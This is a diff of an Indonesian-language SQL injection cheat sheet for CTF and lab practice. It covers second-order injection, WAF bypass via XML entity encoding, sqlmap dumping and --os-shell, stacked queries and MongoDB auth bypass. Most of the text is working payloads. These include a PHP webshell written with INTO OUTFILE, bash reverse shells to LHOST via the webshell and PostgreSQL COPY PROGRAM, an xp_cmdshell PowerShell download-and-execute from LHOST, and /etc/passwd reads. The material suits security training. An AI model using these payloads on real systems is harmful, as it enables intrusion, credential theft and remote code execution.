+Kemudian fitur "Change Password" pakai query:
+
+```sql
+UPDATE users SET password='newpass' WHERE username='admin'--'
+```
+
+→ Comment out kondisi WHERE username → update semua user password!
+
+### Cara Identify di Burp
+
+```
+[Burp] HTTP History:
+1. Cari request registration / profile update / comment / saved search
+2. Inject payload: test'-- 
+3. Browse ke fitur lain: /profile, /search, /admin/report, /order-history
+4. Perhatikan: SQL error, unexpected result, behavior change
+
+Fitur yang sering jadi "trigger":
+- GET /profile → user settings
+- GET /search?q= → saved search
+- GET /admin/report → admin panel
+- GET /order-history → purchase history
 ```
 
 ---
+
+# 🧩 9. Filter / Encoding / WAF Bypass
+
+## 9.1 Filter Bypass via XML Encoding (Lab 18)
+
+### 📌 Skenario
+
+Aplikasi punya WAF/filter yang detect keyword SQL (`UNION`, `SELECT`, dll) di request body. Tapi request berformat **XML** → bisa encode payload pakai XML entity encoding untuk bypass.
+
+### Request Normal
+
+```xml
+POST /product/stock HTTP/1.1
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
+
+### Payload Langsung — Akan Di-block WAF
+
+```xml
+<storeId>1 UNION SELECT NULL</storeId>
+```
+
+→ WAF detect `UNION SELECT` → 403 / "Attack detected"
+
+### Bypass: XML Entity Encoding
+
+Encode keyword SQL dengan HTML/XML entities:
+
+```xml
+<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; NULL</storeId>
+```
+
+XML parser decode entity → string asli `UNION SELECT` diteruskan ke DB.
+
+### Payload Lengkap (Dump Users via XML)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username||'~'||password FROM users--</storeId>
+</stockCheck>
+```
+
+### Burp Suite Steps
+
+```
+[Burp] Intercept POST /product/stock → Send to Repeater
+
+1. Test payload biasa dulu:
+   <storeId>1 UNION SELECT NULL</storeId>
+   → Lihat apakah di-block (403 / "Attack detected")
+
+2. Encode UNION SELECT:
+   UNION → &#x55;&#x4e;&#x49;&#x4f;&#x4e;
+   SELECT → &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;
+
+3. Full payload dengan concat:
+   <storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username||'~'||password FROM users--</storeId>
+
+4. Response → cari data user di output
+```
+
+### Hackvertor Extension (Burp Community/Pro)
+
+```
+[Burp] Extensibility → BApp Store → Install "Hackvertor"
+
+1. Di Repeater, highlight teks yang mau di-encode
+2. Klik kanan → Extensions → Hackvertor → Encode → hex_entities
+3. Hackvertor auto-encode dan kirim ter-decode ke server
+```
+
+### Referensi Encoding
+
+|Karakter|XML Entity Hex|
+|---|---|
+|U|`&#x55;`|
+|N|`&#x4e;`|
+|I|`&#x49;`|
+|O|`&#x4f;`|
+|N|`&#x4e;`|
+|S|`&#x53;`|
+|E|`&#x45;`|
+|L|`&#x4c;`|
+|C|`&#x43;`|
+|T|`&#x54;`|
+
+---
+
+## 9.2 WAF Detection
+
+```bash
+# Tool otomatis
+wafw00f http://TARGET
+
+# Manual dari response header
+curl -si http://TARGET | grep -iE "(CF-Ray|X-Sucuri-ID|Server|Via|X-Cache)"
+```
+
+Indicator WAF response:
+
+```
+403 Forbidden         → keyword filter / signature match
+406 Not Acceptable    → content validation
+429 Too Many Requests → rate limiting
+CF-Ray header         → Cloudflare
+X-Sucuri-ID header    → Sucuri
+Challenge page / CAPTCHA
+```
+
+> **Fingerprint bukan proof absolut.** WAF detect adalah indikator, bukan kepastian. Test langsung.
+
+---
+
+## 9.3 WAF Bypass Techniques
+
+> **Prinsip:** Bypass hanya relevan jika ada WAF/filtering terbukti memblok request. Jangan mengubah payload tanpa mengerti apa yang diblok. Tambahkan satu teknik bypass sekaligus dan retest.
+
+### Case Variation
+
+```
+Gifts' UnIoN SeLeCt NULL-- -
+```
+
+### Comment Injection [MySQL]
+
+```
+Gifts'/*!UNION*//*!SELECT*/NULL-- -
+```
+
+### Whitespace Alternative
+
+```
+Gifts'/**/UNION/**/SELECT/**/NULL-- -
+Gifts'%09UNION%09SELECT%09NULL-- -   (tab)
+Gifts'%0aUNION%0aSELECT%0aNULL-- -  (newline)
+```
+
+### Hex Encoding String Values
+
+```sql
+-- 'users' → 0x7573657273
+-- Hindari filter string literal
+'+UNION+SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema=0x73686f7064622d-- -
+```
+
+### Double URL Encoding
+
+```
+' → %27 → %2527
+```
+
+Gunakan hanya jika terbukti aplikasi/proxy mendecode lebih dari satu kali. Jangan assume ini bekerja.
+
+### Keyword Splitting [MySQL]
+
+```sql
+UN/**/ION SEL/**/ECT 1,2,3
+```
+
+WAF modern dengan normalization engine mungkin tidak tertipu ini.
+
+---
+
+# 🤖 10. SQLMap Workflow
+
+> **Filosofi penggunaan:**
+> 
+> ```
+> Manual discovery
+>      ↓
+> Manual validation (konfirmasi ada SQLi)
+>      ↓
+> Understand injection (context, technique, DB)
+>      ↓
+> SQLMap automation
+> ```
+> 
+> Jangan mulai langsung dengan SQLMap. Kamu tidak belajar apapun, dan SQLMap bisa gagal ketika manual berhasil karena header/cookie kompleks, WAF, atau parameter injection yang tidak dideteksi otomatis.
+
+## Cara Paling Reliable: Dari File Request Burp
+
+```
+[Burp] Intercept request → Klik kanan → "Save item" → Simpan sebagai request.txt
+```
+
+```bash
+sqlmap -r request.txt --batch --dbs
+```
+
+`-r` otomatis handle: method, headers, cookies, body, parameters. Tidak perlu set manual.
+
+---
+
+## GET Parameter
+
+```bash
+sqlmap -u "http://TARGET/item?id=10" \
+  -p id --batch --dbs
+```
 
 ## POST Parameter
 
 ```bash
-sqlmap \
--u "http://TARGET/login" \
---data="username=test&password=test" \
--p username \
---batch
+sqlmap -u "http://TARGET/login" \
+  --data="username=test&password=test" \
+  -p username --batch --dbs
 ```
-
----
 
 ## Cookie Injection
 
 ```bash
-sqlmap \
--u "http://TARGET/dashboard" \
---cookie="PHPSESSID=abc123" \
---batch
+sqlmap -u "http://TARGET/dashboard" \
+  --cookie="TrackingId=xyz*" \
+  --batch --dbs
+# (*) menandai injection point di cookie value
 ```
-
-Target cookie spesifik:
-
-```bash
-sqlmap \
--u "http://TARGET/" \
---cookie="tracking=abc123" \
--p tracking \
---batch
-```
-
----
 
 ## Header Injection
 
-Misalnya `User-Agent`:
-
 ```bash
-sqlmap \
--u "http://TARGET/" \
---user-agent="test*" \
---batch
+# User-Agent injection
+sqlmap -u "http://TARGET/" \
+  --user-agent="test*" --batch --dbs
+
+# Custom header
+sqlmap -u "http://TARGET/" \
+  --headers="X-Forwarded-For: 10.0.0.1*" --batch --dbs
 ```
-
-Atau:
-
-```bash
-sqlmap \
--u "http://TARGET/" \
---headers="X-Forwarded-For: 10.0.0.1*" \
---batch
-```
-
----
 
 ## JSON Body
 
-Buat:
-
 ```bash
-cat > request.json <<'EOF'
-{
-  "username": "test",
-  "search": "hello*"
-}
+# Cara terbaik: dari request file
+cat > api_request.txt << 'EOF'
+POST /api/search HTTP/1.1
+Host: TARGET
+Content-Type: application/json
+Content-Length: 20
+
+{"search":"test*"}
 EOF
-```
 
-Command:
-
-```bash
-sqlmap \
--u "http://TARGET/api/search" \
---data-binary @request.json \
--H "Content-Type: application/json" \
---batch
-```
-
-Untuk request kompleks, cara paling reliable:
-
-```bash
-Burp → Save request → sqlmap -r request.txt
+sqlmap -r api_request.txt --batch --dbs
 ```
 
 ---
 
-## Request File
+## Enumeration Sequence
 
 ```bash
-sqlmap \
--r request.txt \
---batch
-```
+# 1. List databases
+sqlmap -r request.txt --batch --dbs
 
-Ini sangat berguna karena mempertahankan:
+# 2. List tables
+sqlmap -r request.txt --batch -D targetdb --tables
 
-```text
-headers
-cookies
-body
-method
-parameters
+# 3. List columns
+sqlmap -r request.txt --batch -D targetdb -T users --columns
+
+# 4. Dump specific columns
+sqlmap -r request.txt --batch -D targetdb -T users -C username,password --dump
 ```
 
 ---
 
-# 8.3 Enumeration dengan SQLMap
-
-## Step 1 — Detect Injectable Parameter
+## SQLMap dengan Teknik Spesifik
 
 ```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
--p id \
---batch
+# Hanya UNION
+sqlmap -r request.txt --technique=U --batch --dbs
+
+# Hanya Boolean Blind
+sqlmap -r request.txt --technique=B --batch --dbs
+
+# Hanya Time-Based
+sqlmap -r request.txt --technique=T --time-sec=10 --batch --dbs
+
+# Hanya Error-Based
+sqlmap -r request.txt --technique=E --batch --dbs
 ```
 
-Contoh:
+## Proxy via Burp Suite
 
-```text
-[INFO] testing 'AND boolean-based blind'
-[INFO] testing 'UNION query'
-[INFO] parameter 'id' appears to be injectable
+```bash
+# Lihat semua request SQLMap di Burp HTTP History
+sqlmap -r request.txt \
+  --proxy="http://127.0.0.1:8080" \
+  --batch --dbs
 ```
+
+Berguna untuk: debug payload SQLMap, capture request, analisis manual.
 
 ---
 
-## Step 2 — List Databases
+## SQLMap Output Analysis
 
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
--p id \
---dbs \
---batch
 ```
-
-One-liner:
-
-```bash
-sqlmap -u "http://TARGET/item?id=10" -p id --dbs --batch
-```
-
-Output:
-
-```text
-available databases:
-[*] information_schema
-[*] shopdb
-[*] mysql
-[*] performance_schema
-```
-
----
-
-## Step 3 — List Tables
-
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
--p id \
--D shopdb \
---tables \
---batch
-```
-
-Output:
-
-```text
-Database: shopdb
-[3 tables]
-+----------+
-| users    |
-| products |
-| orders   |
-+----------+
-```
-
----
-
-## Step 4 — List Columns
-
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
--p id \
--D shopdb \
--T users \
---columns \
---batch
-```
-
-Output:
-
-```text
-Database: shopdb
-Table: users
-
-+----------+-------------+
-| Column   | Type        |
-+----------+-------------+
-| id       | int         |
-| username | varchar     |
-| password | varchar     |
-| email    | varchar     |
-+----------+-------------+
-```
-
----
-
-## Step 5 — Dump Data
-
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
--p id \
--D shopdb \
--T users \
---dump \
---batch
-```
-
----
-
-## Step 6 — Dump Specific Columns
-
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
--p id \
--D shopdb \
--T users \
--C username,password \
---dump \
---batch
-```
-
----
-
-## Full One-Liner Sequence
-
-### Detect
-
-```bash
-sqlmap -u "http://TARGET/item?id=10" -p id --batch
-```
-
-### DBs
-
-```bash
-sqlmap -u "http://TARGET/item?id=10" -p id --dbs --batch
-```
-
-### Tables
-
-```bash
-sqlmap -u "http://TARGET/item?id=10" -p id -D shopdb --tables --batch
-```
-
-### Columns
-
-```bash
-sqlmap -u "http://TARGET/item?id=10" -p id -D shopdb -T users --columns --batch
-```
-
-### Dump
-
-```bash
-sqlmap -u "http://TARGET/item?id=10" -p id -D shopdb -T users --dump --batch
-```
-
-### Specific columns
-
-```bash
-sqlmap -u "http://TARGET/item?id=10" -p id -D shopdb -T users -C username,password --dump --batch
-```
-
----
-
-# 8.4 Advanced SQLMap
-
-## Tamper Scripts
-
-### 📌 Kapan Digunakan
-
-Saat:
-
-```text
-SQLi manual terbukti
-BUT
-WAF memblok request tertentu.
-```
-
-List:
-
-```bash
-sqlmap --list-tampers
-```
-
----
-
-## Common Tampers
-
-|Tamper|Fungsi|Kapan Dipakai|
-|---|---|---|
-|`space2comment`|whitespace → comments|WAF memblok spasi|
-|`between`|operator `=`/comparison variation|Filter keyword/operator|
-|`randomcase`|case randomization|Case-sensitive filtering|
-|`charencode`|encode karakter|URL/filter normalization|
-|`base64encode`|encode payload|Hanya jika aplikasi melakukan decode base64|
-|`equaltolike`|`=` → `LIKE`|Filter operator tertentu|
-
-Contoh:
-
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
---tamper=space2comment \
---batch
-```
-
-Gabungan:
-
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
---tamper=space2comment,randomcase \
---batch
-```
-
-**Jangan menambahkan banyak tamper secara acak.** Setiap transformasi dapat merusak payload.
-
----
-
-## Level dan Risk
-
-### `--level`
-
-```bash
---level=1
-```
-
-hingga:
-
-```bash
---level=5
-```
-
-Semakin tinggi:
-
-```text
-lebih banyak parameter/payload diuji
-→ lebih banyak request
-→ lebih lambat
-```
-
-### `--risk`
-
-```text
---risk=1
---risk=2
---risk=3
-```
-
-Risk lebih tinggi dapat menggunakan test yang lebih agresif.
-
-Untuk CTF mulai:
-
-```bash
---level=1 --risk=1
-```
-
-Naikkan hanya bila diperlukan.
-
----
-
-## Proxy melalui Burp
-
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
---proxy="http://127.0.0.1:8080" \
---batch
-```
-
-Flow:
-
-```text
-SQLMap
-  │
-  ▼
-127.0.0.1:8080
-  │
-  ▼
-Burp Proxy
-  │
-  ▼
-Target
-```
-
----
-
-## `--os-shell`
-
-### 📌 Kapan Digunakan
-
-Hanya setelah SQLMap membuktikan bahwa:
-
-```text
-DBMS
-+
-DB privilege
-+
-OS interaction primitive
-+
-server configuration
-```
-
-memungkinkan OS command execution.
-
-Command:
-
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
---os-shell \
---batch
-```
-
-Jika tidak berhasil:
-
-```text
-not every SQLi → OS shell
-```
-
----
-
-## File Read
-
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
---file-read="/etc/passwd" \
---batch
-```
-
-Windows example:
-
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
---file-read="C:/Windows/win.ini" \
---batch
-```
-
----
-
-## File Write
-
-Contoh:
-
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
---file-write="shell.php" \
---file-dest="/var/www/html/shell.php" \
---batch
-```
-
-Syarat:
-
-```text
-database privilege
-filesystem permission
-correct DBMS primitive
-webserver write path
-```
-
----
-
-# 8.5 SQLMap Output Analysis
-
-## Injectable Parameter
-
-Cari:
-
-```text
+# Injectable confirmed:
 parameter 'id' is vulnerable
-```
 
----
-
-## Injection Type
-
-Contoh:
-
-```text
+# Injection type detected:
 boolean-based blind
 time-based blind
 UNION query
 error-based
+
+# DB info:
+back-end DBMS: MySQL >= 5.0.12
+banner: 8.0.32-MySQL Community Server
 ```
 
-Jangan menyamakan:
+> **Jangan samakan "SQLi detected" dengan "full database access".** Kemampuan tergantung teknik yang berhasil dan privilege DB.
 
-```text
-"SQLi detected"
-```
-
-dengan:
-
-```text
-"full database access"
-```
-
-Kemampuan tergantung teknik dan privilege.
-
----
-
-## Database Banner
-
-Contoh:
-
-```text
-back-end DBMS: MySQL
-banner: 8.0.x
-```
-
----
-
-## Dump Location
-
-SQLMap menyimpan data di:
-
-```text
-~/.local/share/sqlmap/
-```
-
-Cari:
+SQLMap menyimpan hasil di:
 
 ```bash
-find ~/.local/share/sqlmap -type f | head
-```
-
-Atau:
-
-```bash
-find ~/.local/share/sqlmap -type f | grep -E \
-'dump|log|session'
+find ~/.local/share/sqlmap -type f | grep -E 'dump|log'
 ```
 
 ---
 
-# 🛡️ 9. WAF Bypass Techniques
+## Common SQLMap Flags
 
-# 9.1 Common WAF Detection
-
-## 📌 Kapan Digunakan
-
-Saat request SQLi bekerja secara manual sebelum mendapat block:
-
-```text
-403
-406
-429
-```
-
-atau response WAF berubah.
-
----
-
-## wafw00f
-
-Install:
-
-```bash
-sudo apt install wafw00f -y
-```
-
-Run:
-
-```bash
-wafw00f http://TARGET
-```
-
-Contoh:
-
-```text
-[*] Checking http://TARGET
-[+] The site is behind Cloudflare (Cloudflare)
-```
-
-Atau:
-
-```text
-[-] No WAF detected
-```
+|Flag|Fungsi|
+|---|---|
+|`--batch`|Auto-answer semua prompt|
+|`--dbs`|List databases|
+|`-D db --tables`|List tables di DB|
+|`-T tbl --columns`|List columns di table|
+|`--dump`|Dump data|
+|`-C col1,col2`|Kolom spesifik|
+|`--technique=BEUSTQ`|Filter technique|
+|`--time-sec=10`|Threshold time-based|
+|`--level=3 --risk=2`|Lebih agresif (lebih banyak request)|
+|`--tamper=`|Gunakan tamper script|
+|`--random-agent`|Random User-Agent|
+|`--delay=1`|Delay antar request (stealth)|
+|`--os-shell`|Coba OS shell (precondition banyak)|
+|`--file-read=/etc/passwd`|Baca file|
+|`--file-write=src --file-dest=dst`|Tulis file ke server|
+|`--proxy=http://127.0.0.1:8080`|Proxy via Burp|
+|`-r request.txt`|Load request dari file Burp|
 
 ---
 
-## Manual WAF Clues
+## Tamper Scripts untuk WAF
 
-```text
-Server:
-Via:
-X-Cache:
-CF-Ray:
-X-Sucuri-ID:
-403
-429
-challenge page
-CAPTCHA
-```
-
-Fingerprint bukan proof absolut.
-
----
-
-# 9.2 Bypass Techniques
-
-> Bypass syntax hanya relevan jika ada filtering/WAF pada lab. Jangan mengubah payload tanpa mengerti apa yang diblok.
-
-## Case Variation
-
-```sql
-SeLeCt
-UnIoN
-uNiOn SeLeCt
-```
-
-Contoh:
-
-```bash
-curl -G \
---data-urlencode "id=10 UNION SELECT 1,2,3" \
-http://TARGET/item
-```
-
-Variant:
-
-```bash
-curl -G \
---data-urlencode "id=10 UnIoN SeLeCt 1,2,3" \
-http://TARGET/item
-```
-
----
-
-## Comment Injection
-
-MySQL-style:
-
-```sql
-/*!UNION*/ /*!SELECT*/ 1,2,3
-```
-
-Contoh:
-
-```bash
-curl -G \
---data-urlencode \
-"id=10 /*!UNION*/ /*!SELECT*/ 1,2,3" \
-http://TARGET/item
-```
-
----
-
-## URL Encoding
-
-```bash
-curl -G \
---data-urlencode \
-"id=10 UNION SELECT 1,2,3" \
-http://TARGET/item
-```
-
-`--data-urlencode` membantu melakukan encoding karakter yang diperlukan.
-
----
-
-## Double Encoding
-
-Misalnya `%` menjadi `%25`.
-
-Gunakan hanya jika aplikasi/proxy mendecode lebih dari satu kali.
-
-Konsep:
-
-```text
-'        → %27
-%27      → %2527
-```
-
-Jangan menganggap double encoding akan selalu bekerja.
-
----
-
-## Whitespace Alternatives
-
-Tergantung DB:
-
-```text
-space
-tab
-newline
-comment
-```
-
-MySQL comment:
-
-```sql
-SELECT/**/1
-```
-
----
-
-## Keyword Splitting
-
-Pada filtering buruk:
-
-```sql
-UNION SELECT
-```
-
-dapat menjadi:
-
-```sql
-UN/**/ION/**/SEL/**/ECT
-```
-
-Tetapi parser/WAF modern dapat melakukan normalization, sehingga hasilnya sangat implementation-specific.
-
----
-
-# 9.3 SQLMap Tamper Scripts
-
-|Tamper Script|Fungsi|Kapan Dipakai|
+|Tamper|Fungsi|Kapan Dipakai|
 |---|---|---|
-|`space2comment`|ganti spasi dengan comment|Spasi difilter|
-|`between`|ubah comparison|Filter operator tertentu|
-|`randomcase`|randomisasi case|Filter keyword sederhana|
-|`charencode`|encode karakter|Filter character|
-|`base64encode`|Base64 payload|Aplikasi memang decode Base64|
-|`equaltolike`|`=` menjadi `LIKE`|`=` diblok|
-
-Contoh:
+|`space2comment`|Spasi → `/**/`|WAF filter spasi|
+|`randomcase`|RaNdOm CaSe|Filter keyword case-sensitif|
+|`charencode`|URL encode karakter|Filter karakter tertentu|
+|`between`|`>` → `BETWEEN x AND y`|Filter operator comparison|
+|`equaltolike`|`=` → `LIKE`|Filter operator `=`|
+|`base64encode`|Base64 encode payload|Aplikasi decode Base64|
 
 ```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
---tamper=space2comment \
---batch
+sqlmap -r request.txt \
+  --tamper=space2comment,randomcase \
+  --random-agent --batch --dbs
 ```
 
-Urutan troubleshooting:
+> **Jangan stack banyak tamper secara acak.** Setiap transformasi bisa merusak payload. Tambahkan satu tamper, retest, lanjut ke berikutnya hanya jika diperlukan.
 
-```text
-Manual payload
-      │
-      ▼
-Understand block
-      │
-      ▼
-One tamper
-      │
-      ▼
-Retest
-      │
-      ▼
-Second tamper only if needed
-```
+> **Urutan troubleshooting WAF:**
+> 
+> ```
+> Manual payload berhasil tapi WAF memblok SQLMap
+>   ↓
+> Identifikasi apa yang diblok dari response
+>   ↓
+> Pilih satu tamper yang relevan
+>   ↓
+> Retest
+>   ↓
+> Tamper kedua hanya jika masih diblok
+> ```
 
 ---
 
-# 🧱 10. Stacked Queries
-
-# 10.1 Kapan Stacked Queries Bisa Dipakai
-
-## 📌 Kapan Digunakan
-
-Saat DBMS/driver memungkinkan lebih dari satu statement dieksekusi dalam satu request.
-
-Konsep:
-
-```sql
-SELECT ...
-;
-SELECT ...
-```
-
----
-
-## Support Matrix
-
-|DB|Stacked Query Support|Catatan|
-|---|---|---|
-|MySQL|Tergantung driver/API|Multi-statements harus di-enable pada banyak connector|
-|PostgreSQL|Umumnya mendukung multiple statements tertentu|Driver/application behavior penting|
-|MSSQL|Ya|`;` sering digunakan|
-|Oracle|Berbeda|PL/SQL context memiliki aturan sendiri|
-|SQLite|API-dependent|Multiple statements tergantung wrapper|
-
----
-
-## Test
-
-MSSQL:
-
-```text
-10;SELECT 1--
-```
-
-PostgreSQL:
-
-```text
-10;SELECT 1--
-```
-
-MySQL:
-
-```text
-10;SELECT 1-- -
-```
-
-Jika menghasilkan syntax error atau query tidak dijalankan, jangan menganggap stacked queries tersedia.
-
----
-
-# 10.2 RCE via Stacked Queries
-
-## MSSQL — `xp_cmdshell`
+# 🧱 11. Stacked Queries
 
 ### 📌 Kapan Digunakan
 
-Hanya ketika:
-
-```text
-MSSQL
-+
-stacked query
-+
-permission
-+
-xp_cmdshell available/enabled
-```
-
-Concept:
+Saat DBMS/driver memungkinkan lebih dari satu SQL statement dalam satu request.
 
 ```sql
-EXEC xp_cmdshell 'whoami';
+SELECT ...; SELECT ...
+```
+
+### Support Matrix
+
+|DB|Support|Catatan|
+|---|---|---|
+|MySQL|Driver-dependent|Multi-statements harus di-enable di banyak connector; tidak default|
+|PostgreSQL|Umumnya mendukung|Driver/application behavior menentukan|
+|MSSQL|Ya (`;`)|Paling sering mendukung stacked|
+|Oracle|Terbatas|PL/SQL context punya aturan berbeda|
+|SQLite|API-dependent|Tergantung wrapper library|
+
+### Test Stacked Query
+
+```
+[MSSQL/PgSQL]
+id=10; SELECT 1--
+
+[MySQL] (jika multi_statements enabled)
+id=10; SELECT 1-- -
+```
+
+Jika menghasilkan error atau query tidak dijalankan, stacked queries tidak tersedia di context ini.
+
+### Contoh MSSQL Stacked
+
+```
+[MSSQL] Precondition: stacked query support + privilege
+'; EXEC xp_cmdshell 'whoami'--
 ```
 
 ---
 
-## MySQL — INTO OUTFILE
+# 💻 12. SQL Injection → RCE / Escalation
 
-Dapat digunakan untuk menulis file jika:
+> **Ini adalah post-exploitation escalation path, bukan kemampuan default SQLi.** Setiap teknik punya precondition yang ketat.
 
-```text
-FILE privilege
-+
-secure_file_priv permitting destination
-+
-filesystem writable
+## 12.1 Pre-check: Privilege & Configuration
+
+**Sebelum mencoba file write atau command execution, selalu cek prerequisite.**
+
+### [MySQL] Privilege Check
+
+```bash
+# Via UNION (jika tersedia)
+'+UNION+SELECT+GROUP_CONCAT(PRIVILEGE_TYPE),NULL+FROM+information_schema.user_privileges+WHERE+GRANTEE=CONCAT(CHAR(39),user(),CHAR(39))-- -
+```
+
+**Hasil yang kita cari:**
+
+```
+SELECT,INSERT,UPDATE,DELETE,FILE,...
+```
+
+### [MySQL] secure_file_priv Check
+
+```bash
+'+UNION+SELECT+@@secure_file_priv,NULL-- -
+```
+
+Interpretasi:
+
+- `''` (kosong) → tidak dibatasi, bisa tulis ke mana saja (paling baik)
+- `/var/lib/mysql-files/` → hanya bisa tulis ke path itu
+- `NULL` → file read/write dinonaktifkan (tidak bisa INTO OUTFILE)
+
+### [MySQL] Konfirmasi File Read Dulu
+
+Sebelum upload, konfirmasi FILE read privilege bekerja:
+
+```bash
+'+UNION+SELECT+LOAD_FILE('/etc/passwd'),NULL-- -
+```
+
+→ Jika `/etc/passwd` muncul di response → FILE read bekerja → INTO OUTFILE kemungkinan bisa.
+
+---
+
+## 12.2 MySQL — INTO OUTFILE
+
+**Precondition:**
+
+```
+✓ FILE privilege tersedia (lihat 12.1)
+✓ secure_file_priv kosong atau izinkan destination path
+✓ Web root directory writable oleh MySQL process
+✓ Web server mengeksekusi PHP (atau file type yang relevan)
+✓ Tahu path web root (lihat LOAD_FILE Apache config atau coba /var/www/html/)
+```
+
+**Upload webshell:**
+
+```
+'+UNION+SELECT+'<?php system($_GET["c"]); ?>',NULL+INTO+OUTFILE+'/var/www/html/sh.php'-- -
+```
+
+**Verifikasi upload:**
+
+```bash
+curl -s 'http://TARGET/sh.php'
+# Jika tidak ada error = file ada
+
+# Test execution
+curl -s 'http://TARGET/sh.php?c=id'
+# Expected: uid=33(www-data)
+```
+
+**Upgrade ke reverse shell:**
+
+```bash
+# Setup listener
+nc -lvnp 4444
+
+# Trigger reverse shell
+curl -s "http://TARGET/sh.php" \
+  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'"
+```
+
+**Jika INTO OUTFILE gagal:**
+
+```bash
+# Coba via SQLMap --os-shell (handle prerequisite check otomatis)
+sqlmap -r request.txt --os-shell --batch
 ```
 
 ---
 
-## PostgreSQL — COPY
+## 12.3 MSSQL — xp_cmdshell
 
-PostgreSQL versi/configuration tertentu mendukung `COPY ... PROGRAM` untuk menjalankan program OS ketika user DB mempunyai privilege yang sesuai.
+**Precondition:**
 
----
-
-# 💻 11. SQL Injection to RCE
-
-> Ini adalah **post-exploitation escalation path**, bukan kemampuan default SQLi.
-
----
-
-# 11.1 MySQL — INTO OUTFILE
-
-## 📌 Kapan Digunakan
-
-Saat:
-
-```text
-FILE privilege tersedia
-secure_file_priv tidak menghalangi target directory
-web root writable
-web server akan mengeksekusi file
+```
+✓ MSSQL
+✓ Stacked queries support (lihat Section 11)
+✓ Account DB punya sysadmin privilege atau xp_cmdshell sudah enabled
+✓ Outbound network jika mau reverse shell
 ```
 
----
-
-## Cek Privilege
+**Cek apakah xp_cmdshell sudah aktif:**
 
 ```sql
-SELECT FILE_PRIVILEGES
-FROM information_schema.user_privileges;
+'; EXEC xp_cmdshell 'whoami'--
 ```
 
-Atau:
+**Jika disabled, enable dulu (butuh sysadmin):**
 
 ```sql
-SHOW VARIABLES LIKE 'secure_file_priv';
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
 ```
 
-Contoh:
-
-```text
-secure_file_priv = NULL
-```
-
-berarti konfigurasi tidak mengizinkan mekanisme tertentu.
-
-Contoh lain:
-
-```text
-secure_file_priv = /var/lib/mysql-files/
-```
-
-berarti write dibatasi ke directory tersebut.
-
----
-
-## Webshell — Lab Only
-
-Contoh sangat sederhana:
+**Kemudian jalankan command:**
 
 ```sql
-SELECT '<?php system($_GET["cmd"]); ?>'
-INTO OUTFILE '/var/www/html/shell.php';
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC xp_cmdshell 'hostname'--
 ```
 
-Kemudian:
-
-```bash
-curl 'http://TARGET/shell.php?cmd=id'
-```
-
-Expected:
-
-```text
-uid=33(www-data) gid=33(www-data)
-```
-
-> Ini hanya cocok untuk lab. Kemampuan tersebut memerlukan seluruh precondition di atas.
-
----
-
-# 11.2 MSSQL — xp_cmdshell
-
-## 📌 Kapan Digunakan
-
-Jika `xp_cmdshell` tersedia dan account DB memiliki privilege yang memadai.
-
-Check:
+**Reverse shell via PowerShell:**
 
 ```sql
-EXEC xp_cmdshell 'whoami';
+'; EXEC xp_cmdshell 'powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString(''http://LHOST/shell.ps1'')"'--
 ```
-
-Expected:
-
-```text
-nt service\mssqlserver
-```
-
-atau user service account lainnya.
 
 ---
 
-## Enable pada Lab
+## 12.4 PostgreSQL — COPY PROGRAM
 
-Konfigurasi klasik:
+**Precondition:**
+
+```
+✓ PostgreSQL
+✓ Superuser privilege atau pg_execute_server_program role
+✓ COPY ... PROGRAM syntax tersedia (PostgreSQL 9.3+)
+✓ Stacked queries support
+```
 
 ```sql
-EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE;
-
-EXEC sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
+'; COPY (SELECT '') TO PROGRAM 'id'--
+'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/LHOST/4444 0>&1"'--
 ```
 
-Kemudian:
+> Pada PostgreSQL, `COPY PROGRAM` privilege sangat terbatas. `rolsuper=t` di `pg_roles` adalah indicator terkuat.
 
-```sql
-EXEC xp_cmdshell 'whoami';
+---
+
+# 🍃 13. NoSQL Injection
+
+## MongoDB — Auth Bypass
+
+```bash
+# Normal login (fail)
+curl -s -X POST http://TARGET/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"wrong"}'
+# → {"success":false}
+
+# NoSQL injection dengan $ne (not equal)
+curl -s -X POST http://TARGET/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":{"$ne":"invalid"}}'
+# → {"success":true}
+```
+
+## Operator Injection
+
+|Operator|Fungsi|Contoh Payload|
+|---|---|---|
+|`$ne`|Not equal — bypass password check|`{"password":{"$ne":null}}`|
+|`$gt`|Greater than|`{"id":{"$gt":0}}`|
+|`$regex`|Regex match — enumerate data|`{"username":{"$regex":"^admin"}}`|
+|`$where`|JavaScript expression (legacy)|`{"$where":"this.username=='admin'"}`|
+
